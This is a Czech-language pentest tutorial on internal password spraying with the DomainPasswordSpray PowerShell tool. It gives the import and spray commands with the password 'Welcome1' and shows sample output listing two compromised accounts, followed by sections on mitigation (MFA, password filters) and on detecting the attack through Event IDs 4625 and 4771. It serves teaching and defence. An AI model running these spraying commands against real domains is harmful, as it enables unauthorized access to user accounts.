# 🪟 20. INTERNAL PASSWORD SPRAYING Z WINDOWS

### 💡 Proč je DomainPasswordSpray tak efektivní?

Když skript spustíš pod kontextem jakéhokoliv doménového uživatele, nástroj automaticky provede následující kroky:

1. Sám si z doménového kontroleru **vytáhne kompletní seznam aktivních uživatelů** (nemusíš dodávat vlastní seznam).
    
2. Zjistí aktuální **politiku hesel** domény a určí bezpečný limit pokusů.
    
3. **Automaticky vyřadí ze seznamu uživatele, kteří jsou pouhý 1 pokus od uzamčení** (na základě jejich aktuálního `badpwdcount`).
    

## 🚀 Spuštění útoku v PowerShellu

Importuj modul a spusť sprejování s jedním konkrétním heslem (např. `Welcome1`). Výsledky ulož do souboru.

PowerShell

```
# Import modulu a spuštění inteligentního spraye s heslem Welcome1
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### 📋 Průběh v konzoli:

Nástroj tě před spuštěním požádá o finální potvrzení. V ukázce vidíš, že detekoval limit pro uzamčení na hodnotě 5 a vyhledal 2923 uživatelů:

Plaintext

```
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users...

Are you sure you want to perform a password spray against 2923 accounts? [Y] Yes
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1
```

Útok byl úspěšný a získal jsi přístup k účtům **`sgage`** a **`tjohnson`**.

## 🛡️ Mitigace: Jak útokům Password Spraying stoprocentně zabránit?

Zastavit horizontalní hádání hesel je pro obránce komplexní úkol. Vyžaduje strategii **Defense-in-Depth** (obrana do hloubky):

- **Vícefaktorové ověřování (MFA):** Absolutní základ. I když útočník uhodne heslo `Welcome1`, bez druhého faktoru (push notifikace, OTP kód) se do systému nedostane. MFA musí být vynuceno na všech externích i interních vstupech.
    
- **Striktní hygiena hesel (Password Filters):** Použití softwarových filtrů (např. _Azure AD Password Protection_ nebo řešení třetích stran), které uživatelům **kompletně zakážou** nastavit si do hesla název firmy, aktuální rok, roční období nebo běžná slovníková slova (jako právě `Welcome` či `Password`).
    
- **Striktní oddělení pravomocí:** Administrátoři nesmí používat své privilegované účty pro běžnou práci (čtení e-mailů, surfování). Pokud útočník nasprejuje heslo běžného uživatele, nesmí tím získat administrátorská práva.
    

## 🔍 Detekce útoku (Co hledá SOC tým?)

Útoky typu Password Spraying za sebou nechávají v logách doménových kontrolerů specifickou stopu. Obránci konfigurují své SIEM systémy na korelaci těchto událostí:

### 1. Protokol SMB (Klasické přihlašování)

Generuje anomální množství **Event ID 4625** (An account failed to log on). Pokud systém zaznamená např. 100 selhání přihlášení z jedné IP adresy během 1 minuty, ale pokaždé pro _jiné_ uživatelské jméno, jde o jasný Password Spray.

### 2. Protokol LDAP / Kerberos

Sofistikovanější útočníci se vyhýbají SMB a zkouší hesla přímo přes Kerberos. V takovém případě je nutné monitorovat **Event ID 4771** (Kerberos pre-authentication failed). Tento event značí, že uživatelské jméno sice existuje, ale bylo zadáno špatné heslo.

## 🌐 Co tě čeká dál? (External vs. Internal)

V reálných netestovacích scénářích se tato technika masivně používá i zvenčí proti internetovým portálům organizace (např. **Office 365, VPN brány, Outlook Web Access (OWA) nebo Citrix**).